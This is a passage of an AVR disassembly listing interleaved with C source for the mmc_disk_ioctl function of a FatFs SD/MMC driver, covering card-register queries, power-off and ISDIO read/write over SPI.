    43ba:	d2 f7       	brpl	.-12     	; 0x43b0 <mmc_disk_ioctl+0x1d4>
    43bc:	f8 01       	movw	r30, r16
    43be:	80 83       	st	Z, r24
    43c0:	91 83       	std	Z+1, r25	; 0x01
    43c2:	a2 83       	std	Z+2, r26	; 0x02
                        res = RES_OK;
    43c4:	b3 83       	std	Z+3, r27	; 0x03
    43c6:	10 e0       	ldi	r17, 0x00	; 0
                    }
                }
            }
            else                        /* SDv1 or MMCv3 */
            {
                if ((send_cmd(CMD9, 0) == 0) && rcvr_datablock(csd, 16))    /* Read CSD */
    43c8:	61 c0       	rjmp	.+194    	; 0x448c <mmc_disk_ioctl+0x2b0>
    43ca:	40 e0       	ldi	r20, 0x00	; 0
    43cc:	50 e0       	ldi	r21, 0x00	; 0
    43ce:	ba 01       	movw	r22, r20
    43d0:	89 e0       	ldi	r24, 0x09	; 9
    43d2:	45 dd       	rcall	.-1398   	; 0x3e5e <send_cmd>
    43d4:	81 11       	cpse	r24, r1
    43d6:	57 c0       	rjmp	.+174    	; 0x4486 <mmc_disk_ioctl+0x2aa>
    43d8:	60 e1       	ldi	r22, 0x10	; 16
    43da:	70 e0       	ldi	r23, 0x00	; 0
    43dc:	ce 01       	movw	r24, r28
    43de:	01 96       	adiw	r24, 0x01	; 1
    43e0:	f4 dc       	rcall	.-1560   	; 0x3dca <rcvr_datablock>
    43e2:	89 2b       	or	r24, r25
    43e4:	09 f4       	brne	.+2      	; 0x43e8 <mmc_disk_ioctl+0x20c>
    43e6:	51 c0       	rjmp	.+162    	; 0x448a <mmc_disk_ioctl+0x2ae>
                {
                    if (CardType & CT_SDC1)     /* SDv1 */
    43e8:	80 91 5d 09 	lds	r24, 0x095D	; 0x80095d <CardType>
    43ec:	82 ff       	sbrs	r24, 2
    43ee:	1f c0       	rjmp	.+62     	; 0x442e <mmc_disk_ioctl+0x252>
                    {
                        *(DWORD*)buff = (((csd[10] & 63) << 1) + ((WORD)(csd[11] & 128) >> 7) + 1) << ((
    43f0:	8b 85       	ldd	r24, Y+11	; 0x0b
    43f2:	8f 73       	andi	r24, 0x3F	; 63
    43f4:	90 e0       	ldi	r25, 0x00	; 0
    43f6:	88 0f       	add	r24, r24
    43f8:	99 1f       	adc	r25, r25
    43fa:	2c 85       	ldd	r18, Y+12	; 0x0c
    43fc:	27 fd       	sbrc	r18, 7
    43fe:	01 96       	adiw	r24, 0x01	; 1
    4400:	01 96       	adiw	r24, 0x01	; 1
                                            csd[13] >> 6) - 1);
    4402:	2e 85       	ldd	r18, Y+14	; 0x0e
    4404:	22 95       	swap	r18
    4406:	26 95       	lsr	r18
    4408:	26 95       	lsr	r18
    440a:	23 70       	andi	r18, 0x03	; 3
    440c:	30 e0       	ldi	r19, 0x00	; 0
    440e:	21 50       	subi	r18, 0x01	; 1
    4410:	31 09       	sbc	r19, r1
            {
                if ((send_cmd(CMD9, 0) == 0) && rcvr_datablock(csd, 16))    /* Read CSD */
                {
                    if (CardType & CT_SDC1)     /* SDv1 */
                    {
                        *(DWORD*)buff = (((csd[10] & 63) << 1) + ((WORD)(csd[11] & 128) >> 7) + 1) << ((
    4412:	02 c0       	rjmp	.+4      	; 0x4418 <mmc_disk_ioctl+0x23c>
    4414:	88 0f       	add	r24, r24
    4416:	99 1f       	adc	r25, r25
    4418:	2a 95       	dec	r18
    441a:	e2 f7       	brpl	.-8      	; 0x4414 <mmc_disk_ioctl+0x238>
    441c:	a0 e0       	ldi	r26, 0x00	; 0
    441e:	b0 e0       	ldi	r27, 0x00	; 0
    4420:	f8 01       	movw	r30, r16
    4422:	80 83       	st	Z, r24
    4424:	91 83       	std	Z+1, r25	; 0x01
    4426:	a2 83       	std	Z+2, r26	; 0x02
    4428:	b3 83       	std	Z+3, r27	; 0x03
                    else                        /* MMCv3 */
                    {
                        *(DWORD*)buff = ((WORD)((csd[10] & 124) >> 2) + 1) * (((csd[11] & 3) << 3) + ((
                                            csd[11] & 224) >> 5) + 1);
                    }
                    res = RES_OK;
    442a:	10 e0       	ldi	r17, 0x00	; 0
    442c:	2f c0       	rjmp	.+94     	; 0x448c <mmc_disk_ioctl+0x2b0>
                        *(DWORD*)buff = (((csd[10] & 63) << 1) + ((WORD)(csd[11] & 128) >> 7) + 1) << ((
                                            csd[13] >> 6) - 1);
                    }
                    else                        /* MMCv3 */
                    {
                        *(DWORD*)buff = ((WORD)((csd[10] & 124) >> 2) + 1) * (((csd[11] & 3) << 3) + ((
    442e:	8b 85       	ldd	r24, Y+11	; 0x0b
    4430:	8c 77       	andi	r24, 0x7C	; 124
    4432:	90 e0       	ldi	r25, 0x00	; 0
    4434:	95 95       	asr	r25
    4436:	87 95       	ror	r24
    4438:	95 95       	asr	r25
    443a:	87 95       	ror	r24
    443c:	01 96       	adiw	r24, 0x01	; 1
    443e:	4c 85       	ldd	r20, Y+12	; 0x0c
    4440:	24 2f       	mov	r18, r20
    4442:	23 70       	andi	r18, 0x03	; 3
    4444:	30 e0       	ldi	r19, 0x00	; 0
    4446:	22 0f       	add	r18, r18
    4448:	33 1f       	adc	r19, r19
    444a:	22 0f       	add	r18, r18
    444c:	33 1f       	adc	r19, r19
    444e:	22 0f       	add	r18, r18
    4450:	33 1f       	adc	r19, r19
                                            csd[11] & 224) >> 5) + 1);
    4452:	42 95       	swap	r20
    4454:	46 95       	lsr	r20
    4456:	47 70       	andi	r20, 0x07	; 7
                        *(DWORD*)buff = (((csd[10] & 63) << 1) + ((WORD)(csd[11] & 128) >> 7) + 1) << ((
                                            csd[13] >> 6) - 1);
                    }
                    else                        /* MMCv3 */
                    {
                        *(DWORD*)buff = ((WORD)((csd[10] & 124) >> 2) + 1) * (((csd[11] & 3) << 3) + ((
    4458:	24 0f       	add	r18, r20
    445a:	31 1d       	adc	r19, r1
                                            csd[11] & 224) >> 5) + 1);
    445c:	2f 5f       	subi	r18, 0xFF	; 255
    445e:	3f 4f       	sbci	r19, 0xFF	; 255
                        *(DWORD*)buff = (((csd[10] & 63) << 1) + ((WORD)(csd[11] & 128) >> 7) + 1) << ((
                                            csd[13] >> 6) - 1);
                    }
                    else                        /* MMCv3 */
                    {
                        *(DWORD*)buff = ((WORD)((csd[10] & 124) >> 2) + 1) * (((csd[11] & 3) << 3) + ((
    4460:	28 9f       	mul	r18, r24
    4462:	a0 01       	movw	r20, r0
    4464:	29 9f       	mul	r18, r25
    4466:	50 0d       	add	r21, r0
    4468:	38 9f       	mul	r19, r24
    446a:	50 0d       	add	r21, r0
    446c:	11 24       	eor	r1, r1
    446e:	ca 01       	movw	r24, r20
    4470:	a0 e0       	ldi	r26, 0x00	; 0
    4472:	b0 e0       	ldi	r27, 0x00	; 0
    4474:	f8 01       	movw	r30, r16
    4476:	80 83       	st	Z, r24
    4478:	91 83       	std	Z+1, r25	; 0x01
    447a:	a2 83       	std	Z+2, r26	; 0x02
                                            csd[11] & 224) >> 5) + 1);
                    }
                    res = RES_OK;
    447c:	b3 83       	std	Z+3, r27	; 0x03
    447e:	10 e0       	ldi	r17, 0x00	; 0
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    4480:	05 c0       	rjmp	.+10     	; 0x448c <mmc_disk_ioctl+0x2b0>
    4482:	11 e0       	ldi	r17, 0x01	; 1
    4484:	03 c0       	rjmp	.+6      	; 0x448c <mmc_disk_ioctl+0x2b0>
    4486:	11 e0       	ldi	r17, 0x01	; 1
    4488:	01 c0       	rjmp	.+2      	; 0x448c <mmc_disk_ioctl+0x2b0>
                                            csd[11] & 224) >> 5) + 1);
                    }
                    res = RES_OK;
                }
            }
            deselect();
    448a:	11 e0       	ldi	r17, 0x01	; 1
    448c:	83 dc       	rcall	.-1786   	; 0x3d94 <deselect>
            break;
    448e:	81 2f       	mov	r24, r17
            break;
#endif
        /* Following commands are never used by FatFs module */

        case MMC_GET_TYPE :     /* Get card type flags (1 byte) */
            *ptr = CardType;
    4490:	91 c1       	rjmp	.+802    	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    4492:	80 91 5d 09 	lds	r24, 0x095D	; 0x80095d <CardType>
    4496:	db 01       	movw	r26, r22
            res = RES_OK;
            break;
    4498:	8c 93       	st	X, r24

        case MMC_GET_CSD :      /* Receive CSD as a data block (16 bytes) */
            if (send_cmd(CMD9, 0) == 0 && rcvr_datablock(ptr, 16))      /* READ_CSD */
    449a:	80 e0       	ldi	r24, 0x00	; 0
    449c:	8b c1       	rjmp	.+790    	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    449e:	40 e0       	ldi	r20, 0x00	; 0
    44a0:	50 e0       	ldi	r21, 0x00	; 0
    44a2:	ba 01       	movw	r22, r20
    44a4:	89 e0       	ldi	r24, 0x09	; 9
    44a6:	db dc       	rcall	.-1610   	; 0x3e5e <send_cmd>
    44a8:	81 11       	cpse	r24, r1
    44aa:	08 c0       	rjmp	.+16     	; 0x44bc <mmc_disk_ioctl+0x2e0>
    44ac:	60 e1       	ldi	r22, 0x10	; 16
    44ae:	70 e0       	ldi	r23, 0x00	; 0
    44b0:	c8 01       	movw	r24, r16
    44b2:	8b dc       	rcall	.-1770   	; 0x3dca <rcvr_datablock>
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    44b4:	89 2b       	or	r24, r25
    44b6:	21 f4       	brne	.+8      	; 0x44c0 <mmc_disk_ioctl+0x2e4>
    44b8:	11 e0       	ldi	r17, 0x01	; 1
    44ba:	03 c0       	rjmp	.+6      	; 0x44c2 <mmc_disk_ioctl+0x2e6>
        case MMC_GET_CSD :      /* Receive CSD as a data block (16 bytes) */
            if (send_cmd(CMD9, 0) == 0 && rcvr_datablock(ptr, 16))      /* READ_CSD */
            {
                res = RES_OK;
            }
            deselect();
    44bc:	11 e0       	ldi	r17, 0x01	; 1
    44be:	01 c0       	rjmp	.+2      	; 0x44c2 <mmc_disk_ioctl+0x2e6>
            break;
    44c0:	10 e0       	ldi	r17, 0x00	; 0
    44c2:	68 dc       	rcall	.-1840   	; 0x3d94 <deselect>

        case MMC_GET_CID :      /* Receive CID as a data block (16 bytes) */
            if (send_cmd(CMD10, 0) == 0 && rcvr_datablock(ptr, 16))     /* READ_CID */
    44c4:	81 2f       	mov	r24, r17
    44c6:	76 c1       	rjmp	.+748    	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    44c8:	40 e0       	ldi	r20, 0x00	; 0
    44ca:	50 e0       	ldi	r21, 0x00	; 0
    44cc:	ba 01       	movw	r22, r20
    44ce:	8a e0       	ldi	r24, 0x0A	; 10
    44d0:	c6 dc       	rcall	.-1652   	; 0x3e5e <send_cmd>
    44d2:	81 11       	cpse	r24, r1
    44d4:	08 c0       	rjmp	.+16     	; 0x44e6 <mmc_disk_ioctl+0x30a>
    44d6:	60 e1       	ldi	r22, 0x10	; 16
    44d8:	70 e0       	ldi	r23, 0x00	; 0
    44da:	c8 01       	movw	r24, r16
    44dc:	76 dc       	rcall	.-1812   	; 0x3dca <rcvr_datablock>
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    44de:	89 2b       	or	r24, r25
    44e0:	21 f4       	brne	.+8      	; 0x44ea <mmc_disk_ioctl+0x30e>
    44e2:	11 e0       	ldi	r17, 0x01	; 1
    44e4:	03 c0       	rjmp	.+6      	; 0x44ec <mmc_disk_ioctl+0x310>
            break;

        case MMC_GET_CID :      /* Receive CID as a data block (16 bytes) */
            if (send_cmd(CMD10, 0) == 0 && rcvr_datablock(ptr, 16))     /* READ_CID */
            {
                res = RES_OK;
    44e6:	11 e0       	ldi	r17, 0x01	; 1
            }
            deselect();
    44e8:	01 c0       	rjmp	.+2      	; 0x44ec <mmc_disk_ioctl+0x310>
            break;
    44ea:	10 e0       	ldi	r17, 0x00	; 0
    44ec:	53 dc       	rcall	.-1882   	; 0x3d94 <deselect>

        case MMC_GET_OCR :      /* Receive OCR as an R3 resp (4 bytes) */
            if (send_cmd(CMD58, 0) == 0)    /* READ_OCR */
    44ee:	81 2f       	mov	r24, r17
    44f0:	61 c1       	rjmp	.+706    	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    44f2:	40 e0       	ldi	r20, 0x00	; 0
    44f4:	50 e0       	ldi	r21, 0x00	; 0
    44f6:	ba 01       	movw	r22, r20
    44f8:	8a e3       	ldi	r24, 0x3A	; 58
    44fa:	b1 dc       	rcall	.-1694   	; 0x3e5e <send_cmd>
    44fc:	88 23       	and	r24, r24
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    44fe:	69 f0       	breq	.+26     	; 0x451a <mmc_disk_ioctl+0x33e>
        case MMC_GET_OCR :      /* Receive OCR as an R3 resp (4 bytes) */
            if (send_cmd(CMD58, 0) == 0)    /* READ_OCR */
            {
                for (n = 4; n; n--)
                {
                    *ptr++ = xchg_spi(0xFF);
    4500:	11 e0       	ldi	r17, 0x01	; 1
    4502:	11 c0       	rjmp	.+34     	; 0x4526 <mmc_disk_ioctl+0x34a>
    4504:	68 01       	movw	r12, r16
    4506:	bf ef       	ldi	r27, 0xFF	; 255
    4508:	cb 1a       	sub	r12, r27
    450a:	db 0a       	sbc	r13, r27
    450c:	8f ef       	ldi	r24, 0xFF	; 255
    450e:	ec db       	rcall	.-2088   	; 0x3ce8 <xchg_spi>
    4510:	f8 01       	movw	r30, r16
    4512:	80 83       	st	Z, r24
    4514:	fa 94       	dec	r15
    4516:	86 01       	movw	r16, r12
            break;

        case MMC_GET_OCR :      /* Receive OCR as an R3 resp (4 bytes) */
            if (send_cmd(CMD58, 0) == 0)    /* READ_OCR */
            {
                for (n = 4; n; n--)
    4518:	03 c0       	rjmp	.+6      	; 0x4520 <mmc_disk_ioctl+0x344>
    451a:	68 94       	set
                {
                    *ptr++ = xchg_spi(0xFF);
                }
                res = RES_OK;
    451c:	ff 24       	eor	r15, r15
            }
            deselect();
    451e:	f2 f8       	bld	r15, 2
    4520:	f1 10       	cpse	r15, r1
            break;
    4522:	f0 cf       	rjmp	.-32     	; 0x4504 <mmc_disk_ioctl+0x328>

        case MMC_GET_SDSTAT :   /* Receive SD statsu as a data block (64 bytes) */
            if (send_cmd(ACMD13, 0) == 0)   /* SD_STATUS */
    4524:	10 e0       	ldi	r17, 0x00	; 0
    4526:	36 dc       	rcall	.-1940   	; 0x3d94 <deselect>
    4528:	81 2f       	mov	r24, r17
    452a:	44 c1       	rjmp	.+648    	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    452c:	40 e0       	ldi	r20, 0x00	; 0
    452e:	50 e0       	ldi	r21, 0x00	; 0
    4530:	ba 01       	movw	r22, r20
            {
                xchg_spi(0xFF);
    4532:	8d e8       	ldi	r24, 0x8D	; 141
    4534:	94 dc       	rcall	.-1752   	; 0x3e5e <send_cmd>
    4536:	81 11       	cpse	r24, r1
                if (rcvr_datablock(ptr, 64))
    4538:	0a c0       	rjmp	.+20     	; 0x454e <mmc_disk_ioctl+0x372>
    453a:	8f ef       	ldi	r24, 0xFF	; 255
    453c:	d5 db       	rcall	.-2134   	; 0x3ce8 <xchg_spi>
    453e:	60 e4       	ldi	r22, 0x40	; 64
    4540:	70 e0       	ldi	r23, 0x00	; 0
    4542:	c8 01       	movw	r24, r16
    4544:	42 dc       	rcall	.-1916   	; 0x3dca <rcvr_datablock>
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    4546:	89 2b       	or	r24, r25
    4548:	21 f4       	brne	.+8      	; 0x4552 <mmc_disk_ioctl+0x376>
    454a:	11 e0       	ldi	r17, 0x01	; 1
    454c:	03 c0       	rjmp	.+6      	; 0x4554 <mmc_disk_ioctl+0x378>
            if (send_cmd(ACMD13, 0) == 0)   /* SD_STATUS */
            {
                xchg_spi(0xFF);
                if (rcvr_datablock(ptr, 64))
                {
                    res = RES_OK;
    454e:	11 e0       	ldi	r17, 0x01	; 1
                }
            }
            deselect();
    4550:	01 c0       	rjmp	.+2      	; 0x4554 <mmc_disk_ioctl+0x378>
    4552:	10 e0       	ldi	r17, 0x00	; 0
            break;
    4554:	1f dc       	rcall	.-1986   	; 0x3d94 <deselect>
    4556:	81 2f       	mov	r24, r17

        case CTRL_POWER_OFF :   /* Power off */
            power_off();
    4558:	2d c1       	rjmp	.+602    	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    455a:	be db       	rcall	.-2180   	; 0x3cd8 <power_off>
            Stat |= STA_NOINIT;
    455c:	80 91 57 01 	lds	r24, 0x0157	; 0x800157 <Stat>
    4560:	81 60       	ori	r24, 0x01	; 1
    4562:	80 93 57 01 	sts	0x0157, r24	; 0x800157 <Stat>
            res = RES_OK;
    4566:	80 e0       	ldi	r24, 0x00	; 0
            break;
    4568:	25 c1       	rjmp	.+586    	; 0x47b4 <mmc_disk_ioctl+0x5d8>
#if _USE_ISDIO
        case ISDIO_READ:
            sdi = buff;
            if (send_cmd(CMD48, 0x80000000 | (DWORD)sdi->func << 28 |
    456a:	db 01       	movw	r26, r22
    456c:	4c 91       	ld	r20, X
    456e:	50 e0       	ldi	r21, 0x00	; 0
    4570:	60 e0       	ldi	r22, 0x00	; 0
    4572:	70 e0       	ldi	r23, 0x00	; 0
    4574:	03 2e       	mov	r0, r19
    4576:	3c e1       	ldi	r19, 0x1C	; 28
    4578:	44 0f       	add	r20, r20
    457a:	55 1f       	adc	r21, r21
    457c:	66 1f       	adc	r22, r22
    457e:	77 1f       	adc	r23, r23
    4580:	3a 95       	dec	r19
    4582:	d1 f7       	brne	.-12     	; 0x4578 <mmc_disk_ioctl+0x39c>
    4584:	30 2d       	mov	r19, r0
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
    4586:	13 96       	adiw	r26, 0x03	; 3
    4588:	8d 91       	ld	r24, X+
    458a:	9d 91       	ld	r25, X+
    458c:	0d 90       	ld	r0, X+
    458e:	bc 91       	ld	r27, X
    4590:	a0 2d       	mov	r26, r0
    4592:	07 2e       	mov	r0, r23
    4594:	79 e0       	ldi	r23, 0x09	; 9
    4596:	88 0f       	add	r24, r24
    4598:	99 1f       	adc	r25, r25
    459a:	aa 1f       	adc	r26, r26
    459c:	bb 1f       	adc	r27, r27
    459e:	7a 95       	dec	r23
            res = RES_OK;
            break;
#if _USE_ISDIO
        case ISDIO_READ:
            sdi = buff;
            if (send_cmd(CMD48, 0x80000000 | (DWORD)sdi->func << 28 |
    45a0:	d1 f7       	brne	.-12     	; 0x4596 <mmc_disk_ioctl+0x3ba>
    45a2:	70 2d       	mov	r23, r0
    45a4:	48 2b       	or	r20, r24
    45a6:	59 2b       	or	r21, r25
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
    45a8:	6a 2b       	or	r22, r26
    45aa:	7b 2b       	or	r23, r27
    45ac:	f8 01       	movw	r30, r16
    45ae:	81 81       	ldd	r24, Z+1	; 0x01
    45b0:	92 81       	ldd	r25, Z+2	; 0x02
    45b2:	01 97       	sbiw	r24, 0x01	; 1
    45b4:	91 70       	andi	r25, 0x01	; 1
    45b6:	a0 e0       	ldi	r26, 0x00	; 0
    45b8:	b0 e0       	ldi	r27, 0x00	; 0
    45ba:	48 2b       	or	r20, r24
    45bc:	59 2b       	or	r21, r25
            res = RES_OK;
            break;
#if _USE_ISDIO
        case ISDIO_READ:
            sdi = buff;
            if (send_cmd(CMD48, 0x80000000 | (DWORD)sdi->func << 28 |
    45be:	6a 2b       	or	r22, r26
    45c0:	7b 2b       	or	r23, r27
    45c2:	70 68       	ori	r23, 0x80	; 128
    45c4:	80 e3       	ldi	r24, 0x30	; 48
    45c6:	4b dc       	rcall	.-1898   	; 0x3e5e <send_cmd>
    45c8:	81 11       	cpse	r24, r1
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
            {
                for (Timer1 = 100; (rc = xchg_spi(0xFF)) == 0xFF && Timer1; ) ;
    45ca:	39 c0       	rjmp	.+114    	; 0x463e <mmc_disk_ioctl+0x462>
    45cc:	84 e6       	ldi	r24, 0x64	; 100
    45ce:	80 93 60 09 	sts	0x0960, r24	; 0x800960 <Timer1>
    45d2:	8f ef       	ldi	r24, 0xFF	; 255
    45d4:	89 db       	rcall	.-2286   	; 0x3ce8 <xchg_spi>
    45d6:	8f 3f       	cpi	r24, 0xFF	; 255
    45d8:	21 f4       	brne	.+8      	; 0x45e2 <mmc_disk_ioctl+0x406>
    45da:	90 91 60 09 	lds	r25, 0x0960	; 0x800960 <Timer1>
    45de:	91 11       	cpse	r25, r1
                if (rc == 0xFE)
    45e0:	f8 cf       	rjmp	.-16     	; 0x45d2 <mmc_disk_ioctl+0x3f6>
    45e2:	8e 3f       	cpi	r24, 0xFE	; 254
                {
                    for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
    45e4:	71 f5       	brne	.+92     	; 0x4642 <mmc_disk_ioctl+0x466>
    45e6:	d8 01       	movw	r26, r16
    45e8:	17 96       	adiw	r26, 0x07	; 7
    45ea:	cd 90       	ld	r12, X+
    45ec:	dc 90       	ld	r13, X
    45ee:	18 97       	sbiw	r26, 0x08	; 8
    45f0:	11 96       	adiw	r26, 0x01	; 1
    45f2:	ed 90       	ld	r14, X+
    45f4:	fc 90       	ld	r15, X
                    {
                        *bp++ = xchg_spi(0xFF);
    45f6:	12 97       	sbiw	r26, 0x02	; 2
    45f8:	0c c0       	rjmp	.+24     	; 0x4612 <mmc_disk_ioctl+0x436>
    45fa:	56 01       	movw	r10, r12
    45fc:	bf ef       	ldi	r27, 0xFF	; 255
    45fe:	ab 1a       	sub	r10, r27
    4600:	bb 0a       	sbc	r11, r27
    4602:	8f ef       	ldi	r24, 0xFF	; 255
    4604:	71 db       	rcall	.-2334   	; 0x3ce8 <xchg_spi>
    4606:	f6 01       	movw	r30, r12
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
            {
                for (Timer1 = 100; (rc = xchg_spi(0xFF)) == 0xFF && Timer1; ) ;
                if (rc == 0xFE)
                {
                    for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
    4608:	80 83       	st	Z, r24
    460a:	f1 e0       	ldi	r31, 0x01	; 1
                    {
                        *bp++ = xchg_spi(0xFF);
    460c:	ef 1a       	sub	r14, r31
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
            {
                for (Timer1 = 100; (rc = xchg_spi(0xFF)) == 0xFF && Timer1; ) ;
                if (rc == 0xFE)
                {
                    for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
    460e:	f1 08       	sbc	r15, r1
    4610:	65 01       	movw	r12, r10
    4612:	e1 14       	cp	r14, r1
                    {
                        *bp++ = xchg_spi(0xFF);
                    }
                    for (dc = 514 - sdi->ndata; dc; dc--)
    4614:	f1 04       	cpc	r15, r1
    4616:	89 f7       	brne	.-30     	; 0x45fa <mmc_disk_ioctl+0x41e>
    4618:	d8 01       	movw	r26, r16
    461a:	11 96       	adiw	r26, 0x01	; 1
    461c:	8d 91       	ld	r24, X+
    461e:	9c 91       	ld	r25, X
    4620:	12 97       	sbiw	r26, 0x02	; 2
    4622:	02 e0       	ldi	r16, 0x02	; 2
    4624:	12 e0       	ldi	r17, 0x02	; 2
    4626:	08 1b       	sub	r16, r24
                    {
                        xchg_spi(0xFF);
    4628:	19 0b       	sbc	r17, r25
    462a:	04 c0       	rjmp	.+8      	; 0x4634 <mmc_disk_ioctl+0x458>
    462c:	8f ef       	ldi	r24, 0xFF	; 255
                {
                    for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
                    {
                        *bp++ = xchg_spi(0xFF);
                    }
                    for (dc = 514 - sdi->ndata; dc; dc--)
    462e:	5c db       	rcall	.-2376   	; 0x3ce8 <xchg_spi>
    4630:	01 50       	subi	r16, 0x01	; 1
    4632:	11 09       	sbc	r17, r1
    4634:	01 15       	cp	r16, r1
    4636:	11 05       	cpc	r17, r1
                    {
                        xchg_spi(0xFF);
                    }
                    res = RES_OK;
    4638:	c9 f7       	brne	.-14     	; 0x462c <mmc_disk_ioctl+0x450>
    463a:	10 e0       	ldi	r17, 0x00	; 0
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    463c:	03 c0       	rjmp	.+6      	; 0x4644 <mmc_disk_ioctl+0x468>
    463e:	11 e0       	ldi	r17, 0x01	; 1
    4640:	01 c0       	rjmp	.+2      	; 0x4644 <mmc_disk_ioctl+0x468>
                        xchg_spi(0xFF);
                    }
                    res = RES_OK;
                }
            }
            deselect();
    4642:	11 e0       	ldi	r17, 0x01	; 1
    4644:	a7 db       	rcall	.-2226   	; 0x3d94 <deselect>
            break;
    4646:	81 2f       	mov	r24, r17
    4648:	b5 c0       	rjmp	.+362    	; 0x47b4 <mmc_disk_ioctl+0x5d8>

        case ISDIO_WRITE:
            sdi = buff;
            if (send_cmd(CMD49, 0x80000000 | (DWORD)sdi->func << 28 |
    464a:	fb 01       	movw	r30, r22
    464c:	40 81       	ld	r20, Z
    464e:	50 e0       	ldi	r21, 0x00	; 0
    4650:	60 e0       	ldi	r22, 0x00	; 0
    4652:	70 e0       	ldi	r23, 0x00	; 0
    4654:	03 2e       	mov	r0, r19
    4656:	3c e1       	ldi	r19, 0x1C	; 28
    4658:	44 0f       	add	r20, r20
    465a:	55 1f       	adc	r21, r21
    465c:	66 1f       	adc	r22, r22
    465e:	77 1f       	adc	r23, r23
    4660:	3a 95       	dec	r19
    4662:	d1 f7       	brne	.-12     	; 0x4658 <mmc_disk_ioctl+0x47c>
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
    4664:	30 2d       	mov	r19, r0
    4666:	83 81       	ldd	r24, Z+3	; 0x03
    4668:	94 81       	ldd	r25, Z+4	; 0x04
    466a:	a5 81       	ldd	r26, Z+5	; 0x05
    466c:	b6 81       	ldd	r27, Z+6	; 0x06
    466e:	07 2e       	mov	r0, r23
    4670:	79 e0       	ldi	r23, 0x09	; 9
    4672:	88 0f       	add	r24, r24
    4674:	99 1f       	adc	r25, r25
    4676:	aa 1f       	adc	r26, r26
    4678:	bb 1f       	adc	r27, r27
            deselect();
            break;

        case ISDIO_WRITE:
            sdi = buff;
            if (send_cmd(CMD49, 0x80000000 | (DWORD)sdi->func << 28 |
    467a:	7a 95       	dec	r23
    467c:	d1 f7       	brne	.-12     	; 0x4672 <mmc_disk_ioctl+0x496>
    467e:	70 2d       	mov	r23, r0
    4680:	48 2b       	or	r20, r24
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
    4682:	59 2b       	or	r21, r25
    4684:	6a 2b       	or	r22, r26
    4686:	7b 2b       	or	r23, r27
    4688:	81 81       	ldd	r24, Z+1	; 0x01
    468a:	92 81       	ldd	r25, Z+2	; 0x02
    468c:	01 97       	sbiw	r24, 0x01	; 1
    468e:	91 70       	andi	r25, 0x01	; 1
    4690:	a0 e0       	ldi	r26, 0x00	; 0
    4692:	b0 e0       	ldi	r27, 0x00	; 0
            deselect();
            break;

        case ISDIO_WRITE:
            sdi = buff;
            if (send_cmd(CMD49, 0x80000000 | (DWORD)sdi->func << 28 |
    4694:	48 2b       	or	r20, r24
    4696:	59 2b       	or	r21, r25
    4698:	6a 2b       	or	r22, r26
    469a:	7b 2b       	or	r23, r27
    469c:	70 68       	ori	r23, 0x80	; 128
    469e:	81 e3       	ldi	r24, 0x31	; 49
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
            {
                xchg_spi(0xFF);
    46a0:	de db       	rcall	.-2116   	; 0x3e5e <send_cmd>
    46a2:	81 11       	cpse	r24, r1
    46a4:	33 c0       	rjmp	.+102    	; 0x470c <mmc_disk_ioctl+0x530>
                xchg_spi(0xFE);
    46a6:	8f ef       	ldi	r24, 0xFF	; 255
    46a8:	1f db       	rcall	.-2498   	; 0x3ce8 <xchg_spi>
    46aa:	8e ef       	ldi	r24, 0xFE	; 254
                for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
    46ac:	1d db       	rcall	.-2502   	; 0x3ce8 <xchg_spi>
    46ae:	d8 01       	movw	r26, r16
    46b0:	17 96       	adiw	r26, 0x07	; 7
    46b2:	ed 91       	ld	r30, X+
    46b4:	fc 91       	ld	r31, X
    46b6:	18 97       	sbiw	r26, 0x08	; 8
    46b8:	11 96       	adiw	r26, 0x01	; 1
    46ba:	ed 90       	ld	r14, X+
                {
                    xchg_spi(*bp++);
    46bc:	fc 90       	ld	r15, X
    46be:	12 97       	sbiw	r26, 0x02	; 2
    46c0:	0a c0       	rjmp	.+20     	; 0x46d6 <mmc_disk_ioctl+0x4fa>
    46c2:	6f 01       	movw	r12, r30
    46c4:	bf ef       	ldi	r27, 0xFF	; 255
    46c6:	cb 1a       	sub	r12, r27
            if (send_cmd(CMD49, 0x80000000 | (DWORD)sdi->func << 28 |
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
            {
                xchg_spi(0xFF);
                xchg_spi(0xFE);
                for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
    46c8:	db 0a       	sbc	r13, r27
    46ca:	80 81       	ld	r24, Z
    46cc:	0d db       	rcall	.-2534   	; 0x3ce8 <xchg_spi>
                {
                    xchg_spi(*bp++);
    46ce:	e1 e0       	ldi	r30, 0x01	; 1
            if (send_cmd(CMD49, 0x80000000 | (DWORD)sdi->func << 28 |
                         (DWORD)sdi->addr << 9 | ((sdi->ndata - 1) & 0x1FF)) == 0)
            {
                xchg_spi(0xFF);
                xchg_spi(0xFE);
                for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
